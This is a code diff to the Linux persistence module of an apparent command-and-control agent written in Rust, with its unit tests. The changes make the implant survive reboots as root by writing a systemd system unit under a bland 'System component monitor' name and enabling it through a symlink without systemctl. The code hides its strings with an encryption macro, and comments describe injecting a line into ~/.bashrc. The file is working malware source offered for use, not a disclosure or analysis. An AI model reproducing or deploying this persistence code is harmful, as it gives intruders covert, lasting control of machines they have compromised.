@@ -1,4 +1,3 @@
-// src/agent/persistence/linux.rs
 //
 // Linux persistence implementations.
 //
@@ -7,11 +6,15 @@
 // is mode 600 owned by root, so direct write requires root. Using the
 // `crontab` binary is the only reliable non-root path on all distros.
 //
-// Systemd user service (T1543.002): Pure file I/O to
-// ~/.config/systemd/user/<name>.service. Does NOT exec systemctl to enable
-// - the unit is placed on disk and picked up on next login when
-// `systemctl --user daemon-reload` is called naturally by the session.
-// For immediate activation, the operator can issue `shell systemctl --user enable <name>`.
+// Systemd service (T1543.002): Pure file I/O, no systemctl exec. As root a
+// SYSTEM unit is written to /etc/systemd/system/<name>.service
+// (WantedBy=multi-user.target) so the agent starts at boot with no login
+// required. As non-root a USER unit is written to
+// ~/.config/systemd/user/<name>.service (WantedBy=default.target); user
+// units only run while the user's systemd --user manager is alive (login
+// session or lingering), so the install message hints at
+// `sudo loginctl enable-linger $USER` to survive logout/boot.
+// For immediate activation, the operator can issue `shell systemctl [--user] enable <name>`.
 //
 // Shell profile injection (T1546.004): Appends a background exec line to
 // ~/.bashrc and ~/.profile inside a guard block that prevents duplicate
@@ -39,6 +42,13 @@ fn current_username() -> String {
     std::env::var(aes_str!("USER"))
         .or_else(|_| std::env::var(aes_str!("LOGNAME")))
         .unwrap_or_else(|_| aes_str!("unknown"))
+}
+
+fn running_as_root() -> bool {
+    // euid 0 can write /etc/systemd/system and gets a real boot-time system
+    // unit; same libc::geteuid() check as scripting/process.rs.
+    let euid = unsafe { libc::geteuid() };
+    euid == 0
 }
 
 // ── Stable drop location ──────────────────────────────────────────────
@@ -179,38 +189,96 @@ fn systemd_unit_dir() -> Result<PathBuf, String> {
     Ok(home_dir()?.join(aes_str!(".config")).join(aes_str!("systemd")).join(aes_str!("user")))
 }
 
-fn unit_file(name: &str) -> Result<PathBuf, String> {
+fn unit_file_name(name: &str) -> String {
     // Ensure the name ends with .service
-    let fname = if name.ends_with(&aes_str!(".service")) {
+    if name.ends_with(&aes_str!(".service")) {
         name.to_string()
     } else {
         format!("{}{}", name, aes_str!(".service"))
-    };
-    Ok(systemd_unit_dir()?.join(fname))
+    }
 }
 
-fn build_unit(binary_path: &str, description: &str) -> String {
+fn unit_file(name: &str) -> Result<PathBuf, String> {
+    Ok(systemd_unit_dir()?.join(unit_file_name(name)))
+}
+
+fn build_unit(binary_path: &str, description: &str, system: bool) -> String {
     // Type=forking causes systemd to background the process and track the
     // child PID. For a C2 agent that doesn't fork, Type=simple is correct.
     // Restart=on-failure provides auto-recovery without Type=always
     // (which would re-launch even after sys:die).
+    // After=/Wants=network-online.target: network.target only means the
+    // network stack was configured, not that it is up - on DHCP/slow-link
+    // boots the agent could otherwise start before connectivity exists.
+    // System units install WantedBy=multi-user.target (start at boot);
+    // user units WantedBy=default.target (login / linger activation).
+    let wanted_by = if system {
+        aes_str!("multi-user.target")
+    } else {
+        aes_str!("default.target")
+    };
     format!(
-        "{}{}{}{}{}",
+        "{}{}{}{}{}{}{}",
         aes_str!("[Unit]\nDescription="), description,
-        aes_str!("\nAfter=network.target\n\n[Service]\nType=simple\nExecStart="), binary_path,
-        aes_str!("\nRestart=on-failure\nRestartSec=5\n\n[Install]\nWantedBy=default.target\n")
+        aes_str!("\nAfter=network-online.target\nWants=network-online.target\n\n[Service]\nType=simple\nExecStart="), binary_path,
+        aes_str!("\nRestart=on-failure\nRestartSec=5\n\n[Install]\nWantedBy="), wanted_by,
+        aes_str!("\n")
     )
 }
 
 pub fn install_systemd(unit_name: &str, binary_path: &str) -> Result<String, String> {
-    let stable = stable_drop(binary_path, unit_name)?;
+    // Root gets a SYSTEM unit: a systemd *user* unit only runs while the
+    // user's systemd --user manager is alive (login session, or lingering
+    // via `loginctl enable-linger`), so on a headless reboot with no login
+    // the agent would never start. A system unit under /etc/systemd/system
+    // with WantedBy=multi-user.target starts at boot with no login needed.
+    if running_as_root() {
+        return install_system_unit(unit_name, binary_path);
+    }
+    install_user_unit(unit_name, binary_path)
+}
 
+pub fn install_system_unit(unit_name: &str, binary_path: &str) -> Result<String, String> {
+    let stable = stable_drop(binary_path, unit_name)?;
+    let stable = stable.as_str();
+    let dir = PathBuf::from(aes_str!("/etc/systemd/system"));
+
+    let unit_path = dir.join(unit_file_name(unit_name));
+    let contents  = build_unit(stable, &aes_str!("System component monitor"), true);
+
+    fs::write(&unit_path, &contents)
+        .map_err(|e| format!("{}: {}", aes_str!("Write unit file"), e))?;
+
+    // Create symlink in wants/ so it's enabled without systemctl.
+    let wants_dir = dir.join(aes_str!("multi-user.target.wants"));
+    fs::create_dir_all(&wants_dir)
+        .map_err(|e| format!("{}: {}", aes_str!("mkdir wants/"), e))?;
+
+    let link = wants_dir.join(unit_path.file_name().unwrap());
+    let _ = fs::remove_file(&link);
+    std::os::unix::fs::symlink(&unit_path, &link)
+        .map_err(|e| format!("{}: {}", aes_str!("Symlink into wants/"), e))?;
+
+    Ok(format!(
+        "{}\n    {}  {} → {}\n    {}    {}\n    {} {}\n    {} {}\n    {}",
+        aes_str!("[+] Systemd system service installed"),
+        aes_str!("Copied:"), binary_path, stable,
+        aes_str!("Unit:"), unit_path.display(),
+        aes_str!("Symlink:"), link.display(),
+        aes_str!("Activate: systemctl daemon-reload && systemctl start"), unit_name,
+        aes_str!("Detection: inotify on /etc/systemd/system/, journald unit activation log")
+    ))
+}
+
+pub fn install_user_unit(unit_name: &str, binary_path: &str) -> Result<String, String> {
+    let stable = stable_drop(binary_path, unit_name)?;
+    let stable = stable.as_str();
     let dir = systemd_unit_dir()?;
     fs::create_dir_all(&dir)
         .map_err(|e| format!("{} {}: {}", aes_str!("mkdir -p"), dir.display(), e))?;
 
     let unit_path = unit_file(unit_name)?;
-    let contents  = build_unit(&stable, &aes_str!("System component monitor"));
+    let contents  = build_unit(stable, &aes_str!("System component monitor"), false);
 
     fs::write(&unit_path, &contents)
         .map_err(|e| format!("{}: {}", aes_str!("Write unit file"), e))?;
@@ -226,34 +294,52 @@ pub fn install_systemd(unit_name: &str, binary_path: &str) -> Result<String, Str
         .map_err(|e| format!("{}: {}", aes_str!("Symlink into wants/"), e))?;
 
     Ok(format!(
-        "{}\n    {}  {} → {}\n    {}    {}\n    {} {}\n    {} {} {} {}\n    {}",
+        "{}\n    {}  {} → {}\n    {}    {}\n    {} {}\n    {} {} {} {}\n    {}\n    {}",
         aes_str!("[+] Systemd user service installed"),
         aes_str!("Copied:"), binary_path, stable,
         aes_str!("Unit:"), unit_path.display(),
         aes_str!("Symlink:"), link.display(),
         aes_str!("Activate: systemctl --user enable"), unit_name, aes_str!("&& systemctl --user start"), unit_name,
+        aes_str!("Boot: user units need a login session or lingering - run: sudo loginctl enable-linger $USER"),
         aes_str!("Detection: inotify on ~/.config/systemd/user/, journald unit activation log")
     ))
 }
 
 pub fn remove_systemd(unit_name: &str) -> Result<String, String> {
-    let unit_path  = unit_file(unit_name)?;
-    let wants_dir  = systemd_unit_dir()?.join(aes_str!("default.target.wants"));
-    let wants_link = wants_dir.join(unit_path.file_name().unwrap());
-
+    // Mirror of install_systemd: a root-installed unit lives in
+    // /etc/systemd/system (WantedBy=multi-user.target); a user install lives
+    // in ~/.config/systemd/user (WantedBy=default.target). Remove whichever
+    // exists (both, if somehow both are present).
+    let fname = unit_file_name(unit_name);
     let mut removed = Vec::new();
 
-    if wants_link.exists() || wants_link.symlink_metadata().is_ok() {
-        fs::remove_file(&wants_link)
-            .map_err(|e| format!("{}: {}", aes_str!("Remove symlink"), e))?;
-        removed.push(format!("{} {}", aes_str!("symlink"), wants_link.display()));
+    let try_remove = |unit_path: &std::path::Path, wants_link: &std::path::Path, removed: &mut Vec<String>| -> Result<(), String> {
+        if wants_link.symlink_metadata().is_ok() {
+            fs::remove_file(wants_link)
+                .map_err(|e| format!("{}: {}", aes_str!("Remove symlink"), e))?;
+            removed.push(format!("{} {}", aes_str!("symlink"), wants_link.display()));
+        }
+        if unit_path.exists() {
+            fs::remove_file(unit_path)
+                .map_err(|e| format!("{}: {}", aes_str!("Remove unit file"), e))?;
+            removed.push(format!("{} {}", aes_str!("unit"), unit_path.display()));
+        }
+        Ok(())
+    };
+
+    if running_as_root() {
+        let sys_unit = std::path::PathBuf::from(aes_str!("/etc/systemd/system"))
+            .join(&fname);
+        let sys_wants = std::path::PathBuf::from(aes_str!("/etc/systemd/system/multi-user.target.wants"))
+            .join(&fname);
+        try_remove(&sys_unit, &sys_wants, &mut removed)?;
     }
 
-    if unit_path.exists() {
-        fs::remove_file(&unit_path)
-            .map_err(|e| format!("{}: {}", aes_str!("Remove unit file"), e))?;
-        removed.push(format!("{} {}", aes_str!("unit"), unit_path.display()));
-    }
+    let user_unit = systemd_unit_dir()?.join(&fname);
+    let user_wants = systemd_unit_dir()?
+        .join(aes_str!("default.target.wants"))
+        .join(&fname);
+    try_remove(&user_unit, &user_wants, &mut removed)?;
 
     if removed.is_empty() {
         Ok(format!("{}: {}", aes_str!("[~] No systemd unit found for"), unit_name))
@@ -519,7 +605,7 @@ mod tests {
 
     #[test]
     fn build_unit_has_all_three_sections() {
-        let u = build_unit("/bin/agent", "Desc");
+        let u = build_unit("/bin/agent", "Desc", false);
         assert!(u.contains("[Unit]"));
         assert!(u.contains("[Service]"));
         assert!(u.contains("[Install]"));
@@ -527,7 +613,7 @@ mod tests {
 
     #[test]
     fn build_unit_exec_start_equals_provided_path() {
-        let u = build_unit("/path/to/my binary", "D");
+        let u = build_unit("/path/to/my binary", "D", false);
         assert!(
             u.contains("ExecStart=/path/to/my binary"),
             "ExecStart must contain the exact path"
@@ -536,34 +622,46 @@ mod tests {
 
     #[test]
     fn build_unit_type_is_simple() {
-        let u = build_unit("/bin/a", "D");
+        let u = build_unit("/bin/a", "D", false);
         assert!(u.contains("Type=simple"), "Must use Type=simple for a non-forking process");
     }
 
     #[test]
     fn build_unit_restart_is_on_failure() {
-        let u = build_unit("/bin/a", "D");
+        let u = build_unit("/bin/a", "D", false);
         assert!(u.contains("Restart=on-failure"),
             "Must restart on failure, not always (sys:die would re-launch with Type=always)");
     }
 
     #[test]
     fn build_unit_wanted_by_default_target() {
-        let u = build_unit("/bin/a", "D");
+        let u = build_unit("/bin/a", "D", false);
         assert!(u.contains("WantedBy=default.target"));
     }
 
     #[test]
+    fn build_unit_system_wanted_by_multi_user_target() {
+        let u = build_unit("/bin/a", "D", true);
+        assert!(u.contains("WantedBy=multi-user.target"),
+            "System units must start at boot (multi-user.target), got:\n{u}");
+        assert!(!u.contains("WantedBy=default.target"));
+    }
+
+    #[test]
     fn build_unit_description_is_set() {
-        let u = build_unit("/bin/a", "My Custom Description");
+        let u = build_unit("/bin/a", "My Custom Description", false);
         assert!(u.contains("Description=My Custom Description"));
     }
 
     #[test]
-    fn build_unit_after_network_target() {
-        let u = build_unit("/bin/a", "D");
-        assert!(u.contains("After=network.target"),
-            "Agent should start after network is up");
+    fn build_unit_after_network_online_target() {
+        for system in [false, true] {
+            let u = build_unit("/bin/a", "D", system);
+            assert!(u.contains("After=network-online.target"),
+                "Agent should start after network is actually up, got:\n{u}");
+            assert!(u.contains("Wants=network-online.target"),
+                "network-online.target must be pulled in, got:\n{u}");
+        }
     }
 
     // ── unit_file name normalisation ──────────────────────────────────
@@ -649,12 +747,18 @@ mod tests {
 
     // ── install_systemd / remove_systemd lifecycle ────────────────────
 
+    // NOTE: the install tests below call install_user_unit directly (with a
+    // stable_drop setup) rather than the install_systemd dispatcher. The
+    // dispatcher installs a SYSTEM unit under /etc/systemd/system when the
+    // test process runs as root, which would escape the TempHome sandbox.
+
     #[test]
     fn systemd_install_creates_unit_file() {
         let h = TempHome::new("sys_inst");
         let src = fake_bin(h.path(), "agent");
-        let result = install_systemd("test-svc", &src);
-        assert!(result.is_ok(), "install_systemd failed: {:?}", result.err());
+        let _stable = stable_drop(&src, "test-svc").unwrap();
+        let result = install_user_unit("test-svc", &src);
+        assert!(result.is_ok(), "install_user_unit failed: {:?}", result.err());
 
         let unit = format!("{}/.config/systemd/user/test-svc.service", h.path());
         assert!(std::path::Path::new(&unit).exists(), "Unit file not created at {unit}");
@@ -664,7 +768,8 @@ mod tests {
     fn systemd_install_unit_references_stable_path() {
         let h = TempHome::new("sys_stable");
         let src = fake_bin(h.path(), "orig_agent");
-        install_systemd("stable-svc", &src).unwrap();
+        let _stable = stable_drop(&src, "stable-svc").unwrap();
+        install_user_unit("stable-svc", &src).unwrap();
 
         let unit = format!("{}/.config/systemd/user/stable-svc.service", h.path());
         let content = std::fs::read_to_string(&unit).unwrap();
@@ -679,7 +784,8 @@ mod tests {
     fn systemd_install_creates_wants_symlink() {
         let h = TempHome::new("sys_wants");
         let src = fake_bin(h.path(), "agent");
-        install_systemd("wants-svc", &src).unwrap();
+        let _stable = stable_drop(&src, "wants-svc").unwrap();
+        install_user_unit("wants-svc", &src).unwrap();
 
         let link = format!(
             "{}/.config/systemd/user/default.target.wants/wants-svc.service",
@@ -691,10 +797,25 @@ mod tests {
     }
 
     #[test]
+    fn systemd_user_install_hints_enable_linger() {
+        // Without lingering, a user unit never starts on a headless boot
+        // (no login session) - the install message must say so.
+        let h = TempHome::new("sys_linger");
+        let src = fake_bin(h.path(), "agent");
+        let _stable = stable_drop(&src, "linger-svc").unwrap();
+        let msg = install_user_unit("linger-svc", &src).unwrap();
+        assert!(
+            msg.contains("loginctl enable-linger"),
+            "User-unit install must hint at enable-linger for boot survival, got:\n{msg}"
+        );
+    }
+
+    #[test]
     fn systemd_remove_deletes_unit_and_symlink() {
         let h = TempHome::new("sys_rm");
         let src = fake_bin(h.path(), "agent");
-        install_systemd("rm-svc", &src).unwrap();
+        let _stable = stable_drop(&src, "rm-svc").unwrap();
+        install_user_unit("rm-svc", &src).unwrap();
 
         let unit = format!("{}/.config/systemd/user/rm-svc.service", h.path());
         let link = format!(
@@ -725,8 +846,9 @@ mod tests {
         let h = TempHome::new("sys_idem");
         let src = fake_bin(h.path(), "agent");
         // Installing twice should not error - second call overwrites
-        install_systemd("idem-svc", &src).unwrap();
-        install_systemd("idem-svc", &src).unwrap();
+        let _stable = stable_drop(&src, "idem-svc").unwrap();
+        install_user_unit("idem-svc", &src).unwrap();
+        install_user_unit("idem-svc", &src).unwrap();
 
         let unit = format!("{}/.config/systemd/user/idem-svc.service", h.path());
         assert!(std::path::Path::new(&unit).exists());
@@ -880,6 +1002,27 @@ pub fn list() -> String {
     out.push("\n=== Systemd User Units ===".to_string());
     if let Ok(dir) = systemd_unit_dir() {
         match fs::read_dir(&dir) {
+            Ok(entries) => {
+                let units: Vec<_> = entries
+                    .flatten()
+                    .filter(|e| e.path().extension().map(|x| x == "service").unwrap_or(false))
+                    .map(|e| format!("  {}", e.file_name().to_string_lossy()))
+                    .collect();
+                if units.is_empty() {
+                    out.push("  (none)".into());
+                } else {
+                    out.extend(units);
+                }
+            }
+            Err(_) => out.push("  (directory does not exist)".into()),
+        }
+    }
+
+    // Systemd system units (root installs land here)
+    if running_as_root() {
+        out.push("\n=== Systemd System Units ===".to_string());
+        let sysdir = PathBuf::from(aes_str!("/etc/systemd/system"));
+        match fs::read_dir(&sysdir) {
             Ok(entries) => {
                 let units: Vec<_> = entries
                     .flatten()
